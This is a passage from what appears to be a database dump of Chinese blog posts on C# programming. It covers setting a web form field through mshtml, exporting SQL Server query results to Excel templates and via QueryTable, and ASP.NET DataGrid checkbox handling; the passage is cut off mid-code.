/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //HtmlDocument doc = iw.get (HtmlDocument)iw.Document;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //MessageBox.Show(doc.DomDocument.ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mshtml.HTMLDocument doc = (mshtml.HTMLDocument)iw.Document;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //MessageBox.Show(((HTMLInputTextElement)doc.getElementById(&quot;t1&quot;)).value);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //ihtmldocument2接口.可以查看msdn6. 做法有点类似于js对页面htmlelement操作了。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ((HTMLInputTextElement)doc.getElementById(&quot;t1&quot;)).value = textBox1.Text;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //int txtLen = GetWindowTextLength(txtPtr);</p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //MessageBox.Show(winTxt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void button1_Click(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; test();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>aaa.html</p>\r\n\r\n<p>&lt;html id=&quot;aa&quot;&gt;<br />\r\n&lt;title&gt;aaa&lt;/title&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;input id=&quot;t1&quot; name=&quot;txtTest&quot;/&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n\r\n<p>http://blog.csdn.net/fcuandy/archive/2007/12/18/1948204.aspx<br />\r\n为了您的安全，请只打开来源可靠的网址</p>\r\n\r\n<p>打开网站&nbsp;&nbsp;&nbsp; 取消<br />\r\n来自: http://hi.baidu.com/weichaowu/blog/item/b7406187545ef622c65cc3af.html</p>\r\n',0,1438328211,0,0),(142,38,'c#导出excel代码示例(转)','<p>string cnString = @&quot;Password=sa;Persist Security Info=True;User ID=sa;Initial Catalog=tender;Data Source=WANG\\WANG&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlConnection cn = new SqlConnection(cnString);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cn.Open();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string sql = &quot;select id,unama+pname as name,area from tproj where area = &#39;成都&#39;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommand cmd = new SqlCommand(sql, cn);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter sda=new SqlDataAdapter(cmd);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sda.Fill(ds);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int cnt = ds.Tables[0].Rows.Count;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt;=cnt-1; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.Application excel = new Excel.Application();//引用Excel对象</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Application.Workbooks.Open(@&quot;C:\\Documents and Settings\\Administrator\\桌面\\新建文件夹\\123.xls&quot;, m_objOpt, false, m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt, true, m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //excel.Application.Workbooks.Add (true);//引用Excel工作簿</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Visible = false;//使Excel可视</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[2, 2] = ds.Tables[0].Rows[i][2];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[6, 1] = ds.Tables[0].Rows[i][0];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[6, 2] = ds.Tables[0].Rows[i][1];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Application.Workbooks[1].Saved = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string path = @&quot;C:\\Documents and Settings\\Administrator\\桌面\\新建文件夹\\&quot;+ds.Tables[0].Rows[i][2].ToString().Trim()+&quot;-&quot;+ds.Tables[0].Rows[i][1] + &quot;.xls&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Application.Workbooks[1].SaveCopyAs(path);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Application.Workbooks.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Quit();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>这个是我曾经做过的通过从数据库查询数据，然后写入到一个指定的模板，然后另存的一个功能</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>勾选这块的话，不知道你在页面是用什么控件的信息的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我给你个代码，我的控件是DataGrid，添加了个模板列，HeaderTemplate这个是设置的一个全选的功能，里面有个checkAll的JS函数，作用就是将页面上所有的checkbox设为选中或不选中</p>\r\n\r\n<p>&lt;asp:TemplateColumn&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;ItemStyle Width=&quot;30px&quot; /&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;HeaderTemplate&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type=&quot;checkbox&quot; runat=&quot;server&quot; id=&quot;checkAll&quot; onclick=&quot;checkAll(this);&quot; /&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/HeaderTemplate&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;ItemTemplate&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type=&quot;checkbox&quot; runat=&quot;server&quot; id=&quot;CheckItem&quot; /&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/ItemTemplate&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:TemplateColumn&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下面是判断是否选中的,JustAppInfo_List就是我的DataGrid控件</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int iCount = JustAppInfo_List.Items.Count;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; iCount; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HtmlInputCheckBox box = (HtmlInputCheckBox)JustAppInfo_List.Items[i].Cells[0].Controls[1];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (box.Checked == true)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n',0,1438328494,0,0),(143,38,'c#導出excel源碼_c#应用','<p>C#導出Excel方法有多種﹐常用的按照Microsoft 的方法如下:<br />\r\n1﹑&quot;Use Automation to Transfer Data Cell by Cell &quot;<br />\r\n2﹑&quot;Use Automation to Transfer an Array of Data to a Range on a Worksheet &quot;<br />\r\n3﹑&quot;Use Automation to Transfer an ADO Recordset to a Worksheet Range &quot;<br />\r\n4﹑&quot;Use Automation to Create a QueryTable on a Worksheet&quot;<br />\r\n5﹑&quot;Use the Clipboard&quot;<br />\r\n6﹑&quot;Create a Delimited Text File that Excel Can Parse into Rows and Columns&quot;<br />\r\n7﹑&quot;Transfer Data to a Worksheet Using ADO.NET &quot;<br />\r\n在此本人主要使用第4種方法:即利用Excel的QueryTable導出海量數據。<br />\r\n要利用Excel的QueryTable的方法﹐首先需要引用Excel類庫。這個我就不多說了。<br />\r\n第二步就是新增一個窗體文件﹐為簡單起見﹐只在窗體上加一個button按鈕。在Button Click事件中加入操作的代碼。整個操作﹐我只在一個類中實現﹐源碼附貼如下(office2003)﹕<br />\r\nusing System;<br />\r\nusing System.Collections.Generic;<br />\r\nusing System.ComponentModel;<br />\r\nusing System.Data;<br />\r\nusing System.Drawing;<br />\r\nusing System.Text;<br />\r\nusing System.Windows.Forms;</p>\r\n\r\n<p>namespace WindowsApplication3<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; public partial class Form1 : Form<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel.Application m_objExcel = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel.Workbooks m_objBooks = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel._Workbook m_objBook = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel.Sheets m_objSheets = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel._Worksheet m_objSheet = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel.Range m_objRange = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //private Microsoft.Office.Interop.Excel.Font m_objFont = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //private Microsoft.Office.Interop.Excel.QueryTables m_objQryTables = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Microsoft.Office.Interop.Excel._QueryTable m_objQryTable = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Frequenty-used variable for optional arguments.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private object m_objOpt = System.Reflection.Missing.Value;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //DataBase-used variable<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private System.Data.SqlClient.SqlConnection sqlConn = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private string strConnect = &quot;Data Source=192.168.168.253;Password = SHS;User ID=SHS;Initial Catalog=TEST_KM_ERP&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private System.Data.SqlClient.SqlCommand sqlCmd = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Sheets variable<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double dbSheetSize = 65535;//the hight limit number in one sheet<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int intSheetTotalSize = 0;//total record can divied sheet number<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double dbTotalSize = 0;//record total number</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Form1()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int GetTotalSize()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn = new System.Data.SqlClient.SqlConnection(strConnect);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlCmd = new System.Data.SqlClient.SqlCommand(&quot;Select Count(*) From PD_WORKBIL_MST&quot;, sqlConn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn.Open();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dbTotalSize = (int)sqlCmd.ExecuteScalar();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn.Close();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (int)Math.Ceiling(dbTotalSize / this.dbSheetSize);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void DeclareExcelApp()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objExcel = new Microsoft.Office.Interop.Excel.Application();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBooks = (Microsoft.Office.Interop.Excel.Workbooks)m_objExcel.Workbooks;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBook = (Microsoft.Office.Interop.Excel._Workbook)(m_objBooks.Add(m_objOpt));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheets = (Microsoft.Office.Interop.Excel.Sheets)m_objBook.Worksheets;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; intSheetTotalSize = GetTotalSize();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (intSheetTotalSize &lt;= 3)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (this.dbTotalSize &lt;= this.dbSheetSize)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (this.dbTotalSize &lt;= this.dbSheetSize * 2)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(2, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(2, true);<br 